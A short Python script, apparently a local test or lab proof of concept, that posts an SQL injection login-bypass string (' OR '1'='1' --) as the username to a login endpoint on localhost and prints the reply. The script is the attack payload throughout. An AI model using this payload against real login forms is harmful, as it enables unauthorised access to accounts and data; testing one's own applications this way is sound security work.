import requests

url = 'http://127.0.0.1:5000/login'
data = {'username': "' OR '1'='1' --", 'password': 'any_password'}

response = requests.post(url, data=data)

print(response.text)